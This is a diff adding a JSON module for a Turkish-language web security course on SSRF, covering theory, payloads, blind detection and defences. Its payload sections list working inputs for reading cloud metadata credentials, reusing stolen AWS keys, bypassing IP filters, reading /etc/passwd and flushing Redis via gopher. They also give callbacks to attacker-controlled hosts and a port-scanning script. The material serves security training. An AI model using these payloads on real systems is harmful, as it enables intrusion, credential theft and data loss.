@@ -1,0 +1,95 @@
+{
+  "id": "ssrf",
+  "slug": "ssrf",
+  "title": "A10 — Server-Side Request Forgery (SSRF)",
+  "subtitle": "Sunucu Tarafı İstek Sahteciliği",
+  "description": "Sunucuyu iç ağa veya metadata servislerine istek attır. AWS metadata, iç servis tarama, protokol smuggling, blind SSRF.",
+  "icon": "🌐",
+  "order": 10,
+  "tags": ["SSRF", "cloud metadata", "AWS SSRF", "IDOR via SSRF", "blind SSRF", "internal port scan", "protocol smuggling"],
+  "modules": [
+    {
+      "id": "ssrf-intro",
+      "title": "SSRF Nedir?",
+      "description": "Sunucuyu proxy olarak kullanma — iç ağa eriş",
+      "difficulty": "beginner",
+      "duration": "15 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "SSRF Temel Mantığı",
+          "content": "**SSRF:** Uygulama, kullanıcı tarafından sağlanan URL'e istek yapar — saldırgan bu URL'i iç ağ veya zararlı hedeflere yönlendirir.\n\n**SSRF Nerelerde Bulunur?**\n- URL parametresi: `?url=https://hedef.com/image.jpg`\n- Webhook yapılandırması: `webhook_url=https://...`\n- PDF/screenshot oluşturma: `convert_url=...`\n- XML ile URL: `<!ENTITY xxe SYSTEM 'http://...'>`\n- Import/export: `import_from=https://...`\n\n**SSRF ile Neler Yapılabilir?**\n- **İç ağ tarama:** Güvenlik duvarının arkasındaki servisleri keşfet\n- **Cloud metadata:** AWS/Azure/GCP kimlik bilgileri çal\n- **Loopback servis:** 127.0.0.1'deki admin API'ye eriş\n- **Port tarama:** İç ağdaki açık portları bul\n- **Diğer protokoller:** file://, gopher://, dict://\n\n**Gerçek Dünya:**\n- **2019 Capital One:** AWS SSRF → EC2 metadata → IAM token → S3 erişim\n- **2022 GitLab:** SSRF via webhook → internal API"
+        }
+      ]
+    },
+    {
+      "id": "ssrf-basic",
+      "title": "Temel SSRF Saldırıları",
+      "description": "localhost, iç ağ, common bypass teknikleri",
+      "difficulty": "intermediate",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "SSRF Payload'ları",
+          "commands": [
+            {
+              "command": "# Temel SSRF testi — loopback:\n?url=http://localhost/\n?url=http://127.0.0.1/\n?url=http://0.0.0.0/\n?url=http://[::1]/\n\n# Admin panel erişimi:\n?url=http://127.0.0.1:8080/admin\n?url=http://localhost/server-status  # Apache\n?url=http://127.0.0.1:8888/api/users  # İç servis\n\n# İç ağ tarama:\n?url=http://192.168.1.1/         # router admin\n?url=http://10.0.0.1/\n?url=http://172.16.0.1/",
+              "description": "Temel SSRF ile loopback ve iç ağ erişimi"
+            },
+            {
+              "command": "# AWS EC2 Metadata SSRF — en kritik senaryo:\n?url=http://169.254.169.254/\n?url=http://169.254.169.254/latest/meta-data/\n?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\n# Çıktı: AccessKeyId, SecretAccessKey, Token — AWS kimlik bilgileri!\n\n# GCP metadata:\n?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n# Header: Metadata-Flavor: Google gerekiyor!\n\n# Azure metadata:\n?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01\n# Header: Metadata: true gerekiyor!\n\n# Çalınan AWS kimlik bilgileri ile erişim:\nexport AWS_ACCESS_KEY_ID=ASIAXXX\nexport AWS_SECRET_ACCESS_KEY=yyy\nexport AWS_SESSION_TOKEN=zzz\naws s3 ls  # şirketin tüm S3 bucket'larını gör",
+              "description": "Cloud metadata SSRF ile AWS/GCP/Azure kimlik bilgisi çalma",
+              "warning": "Bu saldırı çok ciddi — cloud ortamında tam takeover sağlayabilir. Sadece lab ortamında!"
+            },
+            {
+              "command": "# SSRF bypass teknikleri:\n# IP blacklist bypass:\nhttp://2130706433/        # 127.0.0.1'in decimal karşılığı\nhttp://0x7f000001/        # 127.0.0.1'in hex\nhttp://127.1/             # kısaltılmış\nhttp://127.0.0.1.nip.io/  # DNS rebinding servisi\n\n# URL parsing bypass:\nhttp://evil.com@127.0.0.1/\nhttp://127.0.0.1#.evil.com/\nhttp://evil.com?.127.0.0.1/\n\n# Protokol bypass:\nfile:///etc/passwd\ndict://127.0.0.1:11211/stats  # Memcached\ngopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a  # Redis",
+              "description": "SSRF blacklist bypass teknikleri — IP encoding, URL tricks, protokol değişimi"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "blind-ssrf",
+      "title": "Blind SSRF",
+      "description": "Response görünmüyor ama sunucu istek yapıyor — out-of-band tespit",
+      "difficulty": "advanced",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Blind SSRF Tespiti ve Exploit",
+          "commands": [
+            {
+              "command": "# Blind SSRF tespiti — Burp Collaborator veya webhook.site:\n?url=https://BURP_COLLABORATOR_ID.burpcollaborator.net/ssrf-test\n# Collaborator'da DNS ve HTTP callback gelirse → SSRF var!\n\n# veya ücretsiz:\n?url=https://webhook.site/UUID\n?url=https://SENIN_IP:4444/\n\n# DNS callback:\n?url=http://PAYLOAD.BURP_COLLABORATOR.burpcollaborator.net/\n\n# interactsh (açık kaynak Burp Collaborator alternatifi):\ninteractsh-client  # token üretir\n?url=http://TOKEN.oast.fun/\n# DNS/HTTP isteği geldiğinde konsola yazdırır",
+              "description": "Blind SSRF tespiti — out-of-band callback yöntemleri"
+            },
+            {
+              "command": "# SSRF ile iç port tarama:\n# Response süresine göre port açık/kapalı tespiti:\nimport requests, time\n\ntarget = 'https://hedef.com/fetch?url='\ncommon_ports = [21, 22, 80, 443, 3306, 5432, 6379, 8080, 8443, 27017]\n\nfor port in common_ports:\n    url = f'{target}http://127.0.0.1:{port}/'\n    start = time.time()\n    try:\n        r = requests.get(url, timeout=3)\n        elapsed = time.time() - start\n        print(f'Port {port}: {r.status_code} ({elapsed:.2f}s)')\n    except requests.Timeout:\n        print(f'Port {port}: TIMEOUT')",
+              "description": "SSRF ile loopback port tarama — yanıt süresinden açık/kapalı tespiti"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "ssrf-defense",
+      "title": "SSRF Önleme",
+      "description": "Allowlist, metadata engelleme, ağ segmentasyonu",
+      "difficulty": "intermediate",
+      "duration": "10 dk",
+      "sections": [
+        {
+          "id": "defense",
+          "type": "defense",
+          "title": "SSRF Savunma Stratejileri",
+          "content": "**Birincil Savunma — Allowlist:**\n```python\nfrom urllib.parse import urlparse\nimport ipaddress\n\nALLOWED_HOSTS = ['api.external-service.com', 'cdn.hedef.com']\n\ndef is_safe_url(url: str) -> bool:\n    parsed = urlparse(url)\n    host = parsed.hostname\n    \n    # Allowlist kontrolü:\n    if host not in ALLOWED_HOSTS:\n        return False\n    \n    # IP adresiyse loopback/private kontrol:\n    try:\n        ip = ipaddress.ip_address(host)\n        if ip.is_loopback or ip.is_private or ip.is_link_local:\n            return False\n    except ValueError:\n        pass  # hostname, IP değil\n    \n    return True\n```\n\n**Ek Önlemler:**\n- IMDSv2 (AWS): Token tabanlı metadata, header gerektiriyor\n- Ağ katmanında `169.254.169.254` erişimini güvenlik grubuyla engelle\n- URL fetch eden servis ayrı ağ segmentinde, iç ağa erişimi yok\n- Yanıt içeriğini doğrula — HTML/JSON bekliyorsan XML gelirse red et"
+        }
+      ]
+    }
+  ]
+}
